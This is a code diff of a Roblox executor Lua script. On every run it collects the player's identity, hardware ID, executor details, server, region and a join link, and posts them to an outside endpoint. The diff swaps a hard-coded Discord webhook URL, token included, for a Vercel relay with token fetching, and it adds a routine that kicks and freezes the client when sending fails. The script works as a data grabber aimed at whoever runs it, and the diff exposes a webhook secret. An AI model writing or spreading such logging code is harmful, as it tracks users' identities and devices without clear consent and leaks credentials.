@@ -48,7 +48,7 @@
 
 
 -- i know this was the simplist thing to find it wasnt really protected at all :9 read the warning though
-local _1 = "https://discord.com/api/webhooks/1563560823991967894/0E4MQ8VmSFU8fo-9G2eOZ6M5mxxcF0sEeU84aTtKxZTE122bSfwzqwpR1AnKd_nGr-TU"
+local _1 = "https://ur-4.vercel.app/api"
 
 function _L29()
     local success = false
@@ -189,34 +189,183 @@ _ForceRestHeartbeat = game:GetService("RunService").Heartbeat:Connect(checkHealt
 
 local _2 = (syn and syn.request) or (http and http.request) or (request)
 
-local function _3(_4, _5)
-    local _6 = { embeds = { _5 } }
-    local _7 = HttpService:JSONEncode(_6)
-    if _2 then
-        local _8, _9 = pcall(function()
-            return _2({
-                Url = _4,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = _7
-            })
-        end)
-        if _8 and _9 then
-            local _10 = _9.StatusCode or _9.status or (_9.Success and 204)
-            if _10 == 200 or _10 == 204 then
-                return true
-            end
-        end
+NAMES = {
+    "⚓ Display Name",
+    "🔗 Username",
+    "📌 User ID",
+    "🌐 Server",
+    "📍 Region",
+    "🧩 Executor",
+    "🔢 Version",
+    "🆔 HWID",
+    "Device",
+    "⏱️ Timestamp",
+    "🔗 Join Link",
+}
+TITLE     = "Execution Logs"
+FOOT      = "Dev <3 | New"
+COLOR     = 0xffbdd2
+USER      = "one love for security"
+VAL_MAX   = 1024
+THUMB_MAX = 512
+
+_tok     = nil
+_tok_exp = 0
+
+RELAY_URL = _1
+
+_HALTED = false
+
+function haltExec(errCode, stack)
+    if _HALTED then
+        while true do task.wait(1) end
     end
-    if HttpService and HttpService.PostAsync then
-        local _8, _11 = pcall(function()
-            HttpService:PostAsync(_4, _7, Enum.HttpContentType.ApplicationJson)
-        end)
-        if _8 then
-            return true
-        end
+    _HALTED = true
+
+    _tok = nil
+    _tok_exp = 0
+
+    local reason = tostring(errCode or "UNKNOWN")
+    if stack and type(stack) == "string" and #stack > 0 then
+        reason = reason .. "\n" .. stack:sub(1, 500)
     end
-    return false
+
+    pcall(function()
+        local plr = game:GetService("Players").LocalPlayer
+        if plr then
+            plr:Kick("Failed to validate you :(\n[" .. reason .. "]")
+        end
+    end)
+
+    pcall(function()
+        if _2 then _2 = nil end
+    end)
+
+    NAMES = nil
+    TITLE = nil
+    FOOT = nil
+    COLOR = nil
+    USER = nil
+    VAL_MAX = nil
+    THUMB_MAX = nil
+    RELAY_URL = nil
+
+    while true do
+        task.wait(1)
+    end
+end
+
+function fetchToken()
+    if _HALTED then return nil end
+    if _tok and os.time() < _tok_exp - 5 then
+        return _tok
+    end
+    if not _2 then return nil end
+    local ok, resp = pcall(function()
+        return _2({
+            Url = RELAY_URL .. "/token",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = "{}",
+        })
+    end)
+    if not ok or not resp then return nil end
+    local code = resp.StatusCode or resp.status or (resp.Success and 200)
+    if code ~= 200 then return nil end
+    local ok2, data = pcall(function() return HttpService:JSONDecode(resp.Body) end)
+    if not ok2 or not data or not data.token then return nil end
+    _tok = data.token
+    _tok_exp = data.expiresAt or (os.time() + 55)
+    return _tok
+end
+
+function clean(s, max)
+    if type(s) ~= "string" then return "" end
+    return s:sub(1, max):gsub("[%z\1-\31\127]", "?")
+end
+
+function check(emb)
+    if type(emb) ~= "table" then return nil end
+    if emb.title ~= TITLE then return nil end
+    if tonumber(emb.color) ~= COLOR then return nil end
+    if not emb.footer or emb.footer.text ~= FOOT then return nil end
+    if type(emb.fields) ~= "table" then return nil end
+    if #emb.fields ~= #NAMES then return nil end
+
+    local out = {}
+    for i = 1, #NAMES do
+        local f = emb.fields[i]
+        if type(f) ~= "table" then return nil end
+        if f.name ~= NAMES[i] then return nil end
+        if type(f.value) ~= "string" then return nil end
+        if #f.value > VAL_MAX then return nil end
+        out[i] = {
+            name = NAMES[i],
+            value = clean(f.value, VAL_MAX),
+            inline = f.inline == true,
+        }
+    end
+
+    if not emb.thumbnail or type(emb.thumbnail.url) ~= "string" then return nil end
+
+    return {
+        title = TITLE,
+        color = COLOR,
+        footer = { text = FOOT },
+        thumbnail = { url = clean(emb.thumbnail.url, THUMB_MAX) },
+        fields = out,
+    }
+end
+
+function _3(_4, _5)
+    if _HALTED then return false end
+    if not _2 then return false end
+
+    local emb = check(_5)
+    if not emb then return false end
+
+    local tok = fetchToken()
+    if not tok then
+        haltExec("AUTH_NETWORK", "fetchToken returned nil")
+        return false
+    end
+
+    local body = {
+        token = tok,
+        payload = {
+            username = USER,
+            embeds = { emb },
+        },
+    }
+
+    local ok, encoded = pcall(function() return HttpService:JSONEncode(body) end)
+    if not ok then
+        haltExec("JSON_ENCODE", tostring(encoded))
+        return false
+    end
+
+    local ok2, resp = pcall(function()
+        return _2({
+            Url = RELAY_URL .. "/send",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = encoded,
+        })
+    end)
+
+    _tok = nil
+    _tok_exp = 0
+
+    if not ok2 or not resp then
+        haltExec("SEND_FAILED", tostring(resp))
+        return false
+    end
+    local code = resp.StatusCode or resp.status or (resp.Success and 200)
+    if code ~= 200 then
+        haltExec("SEND_HTTP_" .. tostring(code), resp.Body and resp.Body:sub(1, 300) or nil)
+        return false
+    end
+    return true
 end
 
 local function _12(_13)
@@ -232,7 +381,7 @@ local function _12(_13)
     return _17.data[1].imageUrl
 end
 
-local function _18()
+function _18()
     local _19 = "Unknown"
     local _8, _20 = pcall(function() return UserInputService:GetPlatform() end)
     if _8 and _20 then
@@ -285,7 +434,7 @@ function infoexec()
     return name, version, hwid
 end
 
-local function _23(_24)
+function _23(_24)
     local _25 = game:GetService("ReplicatedStorage"):FindFirstChild("Servers")
     if not _25 then
         return "No servers folder found", "n/a"
@@ -298,7 +447,7 @@ local function _23(_24)
             local _30 = _29:GetAttributes()
             if _30 then
                 local _31 = _30.players
-                if _31 and string.find(tostring(_31), _26) then
+                if _31 and string.find(tostring(_31), _26, 1, true) then
                     _27 = _30.name or "unknown"
                     _28 = _30.region or "n/a"
                     break
@@ -309,7 +458,9 @@ local function _23(_24)
     return _27, _28
 end
 
-local function _32()
+function _32()
+    if _HALTED then return end
+
     local _33
     for i = 1, 10 do
         _33 = _12(LocalPlayer.UserId)
@@ -323,30 +474,30 @@ local function _32()
     local placeId = game.PlaceId or 0
     local jobId = game.JobId or ""
     local joinLink = string.format("roblox://placeId=%d&gameInstanceId=%s", placeId, jobId)
-    
+
     local _37 = {
-        title = "Execution Logs",
-        color = 0xffbdd2,
+        title = TITLE,
+        color = COLOR,
         fields = {
-            { name = "⚓ Display Name", value = tostring(LocalPlayer.DisplayName or "Unknown"), inline = true },
-            { name = "🔗 Username", value = tostring(LocalPlayer.Name or "Unknown"), inline = true },
-            { name = "📌 User ID", value = tostring(LocalPlayer.UserId or "Unknown"), inline = true },
-            { name = "🌐 Server", value = _35, inline = true },
-            { name = "📍 Region", value = _36, inline = true },
-            { name = "🧩 Executor", value = tostring(execName), inline = true },
-            { name = "🔢 Version", value = tostring(execVersion), inline = true },
-            { name = "🆔 HWID", value = tostring(execHwid), inline = false },
-            { name = "Device", value = string.format("%s %s (%s)", _34.emoji, _34.category, _34.platformRaw), inline = false },
-            { name = "⏱️ Timestamp", value = "<t:" .. os.time() .. ":R>", inline = false },
-            { name = "🔗 Join Link", value = joinLink, inline = false }
+            { name = NAMES[1],  value = tostring(LocalPlayer.DisplayName or "Unknown"), inline = true },
+            { name = NAMES[2],  value = tostring(LocalPlayer.Name or "Unknown"),        inline = true },
+            { name = NAMES[3],  value = tostring(LocalPlayer.UserId or "Unknown"),      inline = true },
+            { name = NAMES[4],  value = _35,                                            inline = true },
+            { name = NAMES[5],  value = _36,                                            inline = true },
+            { name = NAMES[6],  value = tostring(execName),                             inline = true },
+            { name = NAMES[7],  value = tostring(execVersion),                          inline = true },
+            { name = NAMES[8],  value = tostring(execHwid),                             inline = false },
+            { name = NAMES[9],  value = string.format("%s %s (%s)", _34.emoji, _34.category, _34.platformRaw), inline = false },
+            { name = NAMES[10], value = "<t:" .. os.time() .. ":R>",                    inline = false },
+            { name = NAMES[11], value = joinLink,                                       inline = false },
         },
         thumbnail = { url = _33 },
-        footer = { text = "Dev <3 | New" }
+        footer = { text = FOOT }
     }
-    _3(_1, _37)
+    _3(RELAY_URL, _37)
 end
 
-if _1 and _1 ~= "" then
+if RELAY_URL and RELAY_URL ~= "" then
     _32()
 end
 
